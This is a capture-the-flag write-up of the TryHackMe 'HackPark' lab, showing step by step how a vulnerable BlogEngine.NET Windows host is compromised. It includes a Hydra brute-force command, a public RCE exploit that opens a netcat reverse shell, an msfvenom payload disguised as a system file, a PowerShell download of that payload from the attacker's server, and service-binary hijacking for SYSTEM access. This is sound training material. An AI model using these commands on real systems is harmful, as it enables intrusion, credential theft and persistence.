# TryHackMe - HackPark Write-Up

"This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows."

## Task 1: Deploy the vulnerable Windows machine

**1) Whats the name of the clown displayed on the homepage?**

Let's start by running an nmap on the device to see what's available to us. I always like to run an aggressive scan (-A) on all ports (-p-) with very verbose information.

```
nmap 10.10.220.231 -A -p- -vv
```

We need to add -Pn to the end of the nmap to skip host discovery, because it is blocking our ping probes.

Next create a directory that will be used for HackPark. 

We can store credentials and useful information/notes here.

Open a root terminal in the HackPark directory.

While the nmap is running, let's navigate to the MACHINE_IP in firefox to look around.

There's a few things worth checking here:
 
* the social media links in the footer... but none of them actually go anywhere.
* login page by blogengine.net
* /post/welcome-to-hack-park which has a comment section (Possible XSS)
* /contact page (Possible XSS)

Let's start by navigating to the Forgot your password? section of the login form.

This seems to be pretty buggy, and not offering any information when we try Administrator & Admin (seen as the author of the first post)

Let's try a hello alert to see if XSS is working for the comment section on the blog post. 

```
<script>alert(‘XSS’)</script>
```

Unfortunately, it seems to get stuck saving the comment and no alert appears. Let's try on the contact page then move on from this method.

No luck, let's go back and check the nmap scan that should be done now.

We can gather a few things from the nmap:

* OS - Microsoft Windows Server 2012 R2
* 3389 for RDP is open
* Port 80 (The site)

We did get some interesting information about the methods on the site though.

```
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
```

Let's go check the /robots.txt to confirm this info. Looks correct. 

I'm going to run a gobusterbuster on the site to see if there are any hidden pages that they may have forgotten to disallow.

```
gobuster dir -u http://10.10.220.231 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Important to note when using dirbuster is the different [status codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) returned by the directories found.

After launching dirbuster, I'm seeing hundreds of available directories (200) but only a few interesting ones.

* /scripts (301) - Not allowed
* /search (200) - Allowed, trying XSS on this - no luck.
* /custom (301) - Not allowed
* /searchhistory (200) - Just takes you to the search page

I'm not finding anything on the site for the clowns name. 

The social media links didn't go anywhere, so lets try a [reverse image search](https://imgops.com/upload) on the clown's photo.

* Try some of the different sites for the photo with imgops. 
* You will find the clown's name (if you didn't already know **IT**).
* Finally, you could do some EXIF. However, I don't want to know where that scary clown is... so I'm going to skip it unless I need it later.

## Task 2:  Using Hydra to brute-force a login

This task name is kind of a give away, but testing the login form earlier I was going to be trying this anyway since there was no lockout for invalid attempts.

**1) What request type is the Windows website login form using?**

Navigate to the login form and inspect the html to find the method, from what I've seen this is usually POST.

```html
<form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
```

We also get the action from this which will be needed to bruteforce the form.

**2) Guess a username, choose a password wordlist and gain credentials to a user account!**

We will also need the following to brute force with hydra:

* Error message for invalid login: Login failed
* id for the username and password fields

```html
<input name="ctl00$MainContent$LoginUser$UserName" type="text" value="no" id="UserName" class="textEntry ltr-dir" />
<input name="ctl00$MainContent$LoginUser$Password" type="password" id="Password" class="passwordEntry ltr-dir" />
```

* VIEWSTATE & EVENTVALIDATION from source

```
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="0gSvbjURsSQNHy6akuYRcAxJovcdMHNTPJVS328KJi6nW/f/UvMSr5I6EqpPpEz3TcCjs4/pv8DtMx1qOyYJuDb44ad0TOYIlHPNKpeQzTBaN2bKVi8vIAohVLP2zEE1JuQOj+Pp8G8wDoPQHlQRAHX5DH5aKMaDbVJAhOJrRkyXGjwYTib86N1+2+muiEXlmT47Xjj5IfIkUmUfVnv1A/00LXIWsYjDDe3zD3rL8acGgIPLYXpdWs/PNmFV44t5uJVrUksqQGp+ZiHwc2HL4LSZM6w/Blt+q+tXT9FnEwD1gWQvXTxOXtEu9Oge5XkrdzLHXeGgzPRXpiWe806+kxmysmkjrgQWlRb0qRVxtUK+Azx6" />
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="eYEtOhBT0lUZFZaXNOcljs3t/wVMr1HibYcCqrOsBUVLuHn40ocjv2g1Wdohss60VK2OCdicwMpDOa85sQWdYV1JMnJAcUfzgbsPykfMtlsIxsTemAGmALXJOFJYbNFTCKSRMMto70qANNCWa5/goDg82EyaxHC0y/o2QfZWhE0qNScL" />
```

I'm going to be using [Burp Suite](https://portswigger.net/burp) to intercept a login request to get the payload (all this info together).

* Start burp.
* Go to proxy tab and turn intercept off.
* Open firefox and navigate to the login page.
* Turn on [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) for Burp.
* Turn intercept on and submit a incorrect login using ^USER^ and ^PASS^ so you don't have to go in and modify the payload.

```
__VIEWSTATE=bn2IF%2FMii4B%2Feif7lhMIfZLZT6E78sPArHOratYwn2FcneCJuHeWJLbw5yTNnI%2Fpv%2BBz9VcFmBshvmIb9yDahSZoNy6%2BHiihSkSrUIAxCL2kis%2FdD0spca1ml3kR9N9DkSBXn%2FK6fk0G6Rk6%2B2jsgRVly9LJbZhE%2BgBOY2m6H0yiAmurav4mSSvcugDw9qaE0Sc%2F6BZE9NFz0RoWjxjq2%2BhhygGG0kYjJOKuyXBIcf6BSj0aLxVW8RALhOtO%2FPLRa8neezjMbCqQSAQyHZuWwJHnQz%2BWC9eK82gjUEu9Jsez%2FePIz8W3NA%2FEwnyhmrLeVbezqo0fvZWahl7sdgks41fVz2RL7YiLkY8z5qtCaNvDZmyL&__EVENTVALIDATION=eBlJe%2Fme8dU7GyaraKmAlVquPs%2F4rKPfnKmHIIcmrd46xPXi2dfMJifYamCroribdwV8wQuqQC%2FJ8VzVbZs8srZitTYWwPecoeZ6tHsbBDbuuyOMu7wEyaWVocZdL%2FdTdBjX8thBwFCCXdD34zMNEtPn9JKBxxJtcPYyxAcwxscD%2BVqO&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

Alright, it's time to try and bruteforce an account with hydra. Let's start with admin and see if we can get anything.

```
hydra -l admin -P rockyou.txt 10.10.220.231 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=bn2IF%2FMii4B%2Feif7lhMIfZLZT6E78sPArHOratYwn2FcneCJuHeWJLbw5yTNnI%2Fpv%2BBz9VcFmBshvmIb9yDahSZoNy6%2BHiihSkSrUIAxCL2kis%2FdD0spca1ml3kR9N9DkSBXn%2FK6fk0G6Rk6%2B2jsgRVly9LJbZhE%2BgBOY2m6H0yiAmurav4mSSvcugDw9qaE0Sc%2F6BZE9NFz0RoWjxjq2%2BhhygGG0kYjJOKuyXBIcf6BSj0aLxVW8RALhOtO%2FPLRa8neezjMbCqQSAQyHZuWwJHnQz%2BWC9eK82gjUEu9Jsez%2FePIz8W3NA%2FEwnyhmrLeVbezqo0fvZWahl7sdgks41fVz2RL7YiLkY8z5qtCaNvDZmyL&__EVENTVALIDATION=eBlJe%2Fme8dU7GyaraKmAlVquPs%2F4rKPfnKmHIIcmrd46xPXi2dfMJifYamCroribdwV8wQuqQC%2FJ8VzVbZs8srZitTYWwPecoeZ6tHsbBDbuuyOMu7wEyaWVocZdL%2FdTdBjX8thBwFCCXdD34zMNEtPn9JKBxxJtcPYyxAcwxscD%2BVqO&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

After a few minutes, we get a WIN!

```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-21 22:43:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.220.231:80/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=bn2IF%2FMii4B%2Feif7lhMIfZLZT6E78sPArHOratYwn2FcneCJuHeWJLbw5yTNnI%2Fpv%2BBz9VcFmBshvmIb9yDahSZoNy6%2BHiihSkSrUIAxCL2kis%2FdD0spca1ml3kR9N9DkSBXn%2FK6fk0G6Rk6%2B2jsgRVly9LJbZhE%2BgBOY2m6H0yiAmurav4mSSvcugDw9qaE0Sc%2F6BZE9NFz0RoWjxjq2%2BhhygGG0kYjJOKuyXBIcf6BSj0aLxVW8RALhOtO%2FPLRa8neezjMbCqQSAQyHZuWwJHnQz%2BWC9eK82gjUEu9Jsez%2FePIz8W3NA%2FEwnyhmrLeVbezqo0fvZWahl7sdgks41fVz2RL7YiLkY8z5qtCaNvDZmyL&__EVENTVALIDATION=eBlJe%2Fme8dU7GyaraKmAlVquPs%2F4rKPfnKmHIIcmrd46xPXi2dfMJifYamCroribdwV8wQuqQC%2FJ8VzVbZs8srZitTYWwPecoeZ6tHsbBDbuuyOMu7wEyaWVocZdL%2FdTdBjX8thBwFCCXdD34zMNEtPn9JKBxxJtcPYyxAcwxscD%2BVqO&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
[STATUS] 1370.00 tries/min, 1370 tries in 00:01h, 14343029 to do in 174:30h, 16 active
[80][http-post-form] host: 10.10.220.231   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-21 22:44:43
```

Let's use Remmina or xfreerdp to try these credentials. No luck but it was worth a try.

Make sure you're in the HackPark directory you created and let's nano/vim to save these credentials.

```
nano admin.txt
admin;1qaz2wsx
CTRL+X
Y
ENTER
```

## Task 3:  Compromise the machine

**1) Now you have logged into the website, are you able to identify the version of the BlogEngine?**

Let's go ahead and log in to our admin account we compromised on the site and try to find the version of BlogEngine being used.

* Immediately we see that we set off some red flags with our attempted XSS comments in the "LATEST COMMENTS" section.
* Let's go ahead and click to delete them all. We see the xss didn't work because comments have to be approved by an admin.
* Now, let's look at the plugins. Create a txt file and list them all along with their version incase we get locked out.
* Finally, we can navigate to the **About section** and find the Version along with some other information.

```
Your BlogEngine.NET Specification

    Version: 3.3.6.0
    Configuration: Single blog
    Trust level: Unrestricted
    Identity: IIS APPPOOL\Blog
    Blog provider: XmlBlogProvider
    Membership provider: XmlMembershipProvider
    Role provider: XmlRoleProvider
```

**2) What is the CVE?**

Now, it's time to look for an exploit. You can use [Exploit-DB](http://www.exploit-db.com/) or searchsploit in terminal.

```
searchsploit blogengine      
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection                                                           | xml/webapps/48422.txt
BlogEngine 3.3 - XML External Entity Injection                                                                             | windows/webapps/46106.txt
BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                                                    | asp/webapps/32874.txt
BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                                          | asp/webapps/35168.txt
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                         | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution                                         | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                                                    | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution                                    | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                                 | aspx/webapps/47014.py
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

You can check any of these exploit files to see the CVE commented, or look at them in exploit-db.

**3) Who is the webserver running as?**

We got the identity earlier in the About section.

Before we move on to Task 4 (Privilege Escalation), we must pick an exploit to launch a shell for initial access.

I will be using BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution.

* Download the [exploit](https://www.exploit-db.com/exploits/46353) into your HackPark dir.
* Modify the TcpClient to your "Tun0 IP", 7777 (or whatever port you want to use).
* Rename the script to PostView.ascx as instructed by the exploit.
* Go to http://MACHINE_IP/admin/#/content/posts to edit the post.
* Open the File Manager (icon on the far right).
* Upload the PostView.ascx script (you should see it appear next to the image).
* Save and open a rlwrap netcat listener (rlwrap allows use of arrow keys in the terminal).

```
rlwrap nc -nlvp 7777
```

Navigate to the directory instructed by the exploit (http://10.10.220.231/?theme=../../App_Data/files)

```
listening on [any] 7777 ...
connect to [Tun0-IP] from (UNKNOWN) [10.10.220.231] 50001
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

Now we have initial access!!

## Task 4: Privilege Escalation

Before we move on, let's try to get a more stable shell. We're going to do this by making a reverse shell with msfvenom.

Let's open another terminal in our HackPark directory and create the msfvenom payload.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=Tun0-IP LPORT=7778 -f exe -o smsss.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: smsss.exe
```

You can name it whatever you want, I chose to create one similar to smss.exe (Session Manager Subsystem)

Now we need to start a HTTP server using python to transfer the shell to the compromised device.

```
python3 -m http.server
```

Now that the server is open, we need to use powershell with our netcat session on the infected device to transfer the file to the temp directory (since we do not have write privileges for the current directory).

```ps
powershell "(New-Object System.Net.WebClient).Downloadfile('http://Tun0-IP:8000/smsss.exe')"
```

We should see this pop up in our http server terminal to confirm the transfer (or dir in the netcat session):

```
10.10.220.231 - - [21/Feb/2021 23:48:56] "GET /smsss.exe HTTP/1.1" 200
```

Alright, now let's open msfconsole in a new terminal window.

We are going to use the multi/handler.
* set the LHOST to your Tun0-IP.
* set the LPORT to the port you picked (7778).
* exploit!

Now jump over to your netcat session and run the binary (smsss.exe).

Awesome, we got a meterpreter shell!

**1) What is the OS version of this windows machine?**

```
sysinfo
```

Do the same process you did to get your msfvenom shell onto the device, to get x86 [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries/x86/Release).

**2) What is the name of the abnormal service running?**

This is the scheduling service, let's look for a binary used by it that we can exploit.

**3) What is the name of the binary you're supposed to exploit?**

Using enumeration with winPEAS, we will find a few things.

**It also lets us know of some AutoLogon credentials for administrator;4q6XvFES7Fdxs. Let's try that with rdp... Looks like we found another path in!**

However, this wasn't the intended path... so let's continue on.  TryHackMe directs towards a binary and Message.exe stands out.

This is useful because WindowsScheduler runs it as system and it will also be persistent.

Now we must move our smsss.exe to the directory Message.exe is located in (c:\Program Files (x86)\SystemScheduler\).

Message.exe creates alerts on the device. So if you were to do echo "Hi!" once you swapped the binaries and had a elevated reverse shell, it would pop up on the device.

Now rename Message.exe to something else (Message.old) and change your shell to Message.exe, swapping the actual binary name with your reverse shell.

Go ahead and exit the current meterpreter session, and run the shell again on the device as Message.exe!

### WIN! We got system!


**4) What is the user flag (on Jeffs Desktop)?**

Navigate to Jeff's desktop and open the flag with type.

**5) What is the root flag?**

We're going to pretend we didn't see it on the desktop when we RDPd.

Navigate to C:/ and run dir /s root.txt*

We will actually see that it is still in recents and there is a link file to it because of that. However, it also shows the actual directory.

## Task 5: Privilege Escalation Without Metasploit

**1) Using winPeas, what was the Original Install time? (This is date and time)**

This is already done, because we used winPEAS to help with our enumeration. It appears when you launch winPEAS the line below the Product ID.

### Congratulations! You're done with the room!

## Mitigations

### Initial Access

### Privilege Escalation

Feel free to reach out to me on [Twitter](https://twitter.com/R_G_9_n) if you have any questions.
